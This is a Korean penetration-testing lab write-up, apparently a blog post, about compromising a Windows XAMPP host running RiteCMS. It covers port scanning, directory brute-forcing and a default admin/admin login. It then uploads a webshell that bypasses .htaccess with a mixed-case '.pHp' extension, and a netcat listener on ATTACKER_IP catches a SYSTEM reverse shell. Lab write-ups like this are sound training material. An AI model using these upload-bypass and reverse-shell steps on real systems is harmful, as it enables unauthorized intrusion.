---
title: '[BHPT] eCommerce'
layout: post
date: 2026-11-09 12:00:00 +0900
featured: /assets/images/redraccoon-logo.png
---

# 8.eCommerce 모의해킹

## 점검환경

분석 기간 | 호스트 이름 | IP주소 | 점검자
---|:---:|---:|---:
2025년 12월 5일 ~ 2025년 12월 6일 | eCommerce | TARGET_IP | 진엽

## 모의해킹 수행 내용
### 정보 수집
대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─$ sudo nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 19:02 EST
Nmap scan report for TARGET_IP
Host is up (0.013s latency).
Not shown: 56580 closed tcp ports (reset), 8938 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds

```
포트 스캔 결과 포트 21,80,135,139,443,445,3306,3389,5985이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─$ nmap -p 21,80,135,139,443,445,3306,3389,5985 -Pn -n --open -sV -sC TARGET_IP -oA ecommerceDetailed --min-rate 700              
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 19:03 EST
Nmap scan report for TARGET_IP
Host is up (0.0082s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.33)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.33
| http-title: Welcome to XAMPP
|_Requested resource was http://TARGET_IP/dashboard/
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.33)
| http-title: Welcome to XAMPP
|_Requested resource was https://TARGET_IP/dashboard/
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.33
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.23 or earlier (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ECOMMERCE
|   NetBIOS_Domain_Name: ECOMMERCE
|   NetBIOS_Computer_Name: ECOMMERCE
|   DNS_Domain_Name: ecommerce
|   DNS_Computer_Name: ecommerce
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-15T00:03:58+00:00
| ssl-cert: Subject: commonName=ecommerce
| Not valid before: 2026-02-13T23:51:40
|_Not valid after:  2026-08-15T23:51:40
|_ssl-date: 2026-02-15T00:04:05+00:00; +2s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-15T00:03:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds
```

80포트 외 별다른 취약점을 발견하지 못하여, 디렉토리 브루트포싱 툴을 이용하여 /ecommerce/admin.php 경로 발견.
```
└─$ gobuster dir -k -u http://TARGET_IP/ecommerce -w /usr/share/wordlists/dirb/common.txt --exclude-length 0
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/ecommerce
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 304]
/.hta                 (Status: 403) [Size: 304]
/.htpasswd            (Status: 403) [Size: 304]
/admin.php            (Status: 200) [Size: 1118]
```

/ecommerce/admin.php 경로에 접근 시 브라우저 title 부분에 plugin과 version정보가 노출됨.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-ecommerce/image.png)

취약점 검색시 RCE가 가능한 PoC 발견.
```
└─$ searchsploit ritecms
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
RiteCMS 1.0.0 - Multiple Vulnerabilities                             | php/webapps/27315.txt
RiteCMS 2.2.1 - Authenticated Remote Code Execution                  | php/webapps/48636.txt
RiteCMS 2.2.1 - Remote Code Execution (Authenticated)                | php/webapps/48915.py
RiteCMS 3.0.0 - Reflected Cross Site Scripting (XSS)                 | multiple/webapps/52413.txt
RiteCMS 3.1.0 - Arbitrary File Deletion (Authenticated)              | php/webapps/50615.txt
RiteCMS 3.1.0 - Arbitrary File Overwrite (Authenticated)             | php/webapps/50614.txt
RiteCMS 3.1.0 - Remote Code Execution (RCE) (Authenticated)          | php/webapps/50616.txt
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

txt를 열어보면 3.1.0 이전 버전에서 모두 가능하며, 확장자에 대문자를 섞어 우회가 가능하고 media경로에 업로드 되는 것을 확인했다.
```
└─$ cat /usr/share/exploitdb/exploits/php/webapps/50616.txt                                 
# Exploit Title: RiteCMS 3.1.0 - Remote Code Execution (RCE) (Authenticated)
# Date: 25/07/2021
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://ritecms.com/
# Software Link: https://github.com/handylulu/RiteCMS/releases/download/V3.1.0/ritecms.v3.1.0.zip
# Version: <= 3.1.0
# Tested on: Windows 10, Ubuntu 18, XAMPP
# Google Dork: intext:"Powered by RiteCMS"
# Reference: https://gist.github.com/faisalfs10x/bd12e9abefb0d44f020bf297a14a4597

.
.
.

$ cat .htaccess

<Files *.php>
deny from all
</Files>

<Files ~ "webshell\.php$">
  Allow from all
</Files>


###################################
# PoC for webshell using Method 2 #
###################################

Steps to Reproduce:

1. Login as admin
2. Go to Files Manager
3. Choose a directory to upload .php file either media or files directory.
4. Then, click Upload file > Browse..
3. Upload .php file with extension of pHp, eg webshell.pHp - to bypass .htaccess
4. The webshell.pHp is available at http://localhost/ritecms.v3.1.0/media/webshell.pHp - if you choose media directory else switch to files directory

```

admin.php 로그인 페이지에서 admin/admin으로 디폴트 계정 및 로그인이 가능했으며, 로그인시 admin > files manager > upload file 경로에서 파일 업로드가 가능했다.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-ecommerce/image-1.png)

파일 이름의 php 확장자에 대문자를 섞어 우회하고, ip와 port를 공격자 PC로 설정하여 파일 업로드 시도.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-ecommerce/image-2.png)

업로드 후 http://TARGET_IP/ecommerce/media/exploit.pHp 접근 시 리버스 쉘을 얻었으며, whoami와 hostname 확인 시 NT Authority\SYSTEM 권한으로 실행되어 별도의 ㅣ권한 상승은 필요 없었다.
```
└─$ nc -lvnp 9988 
listening on [any] 9988 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 49783
b374k shell : connected

Microsoft Windows [Version 10.0.17763.4720]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\Temp>whoami && hostname
whoami && hostname
nt authority\system
ecommerce

C:\Windows\Temp>
```


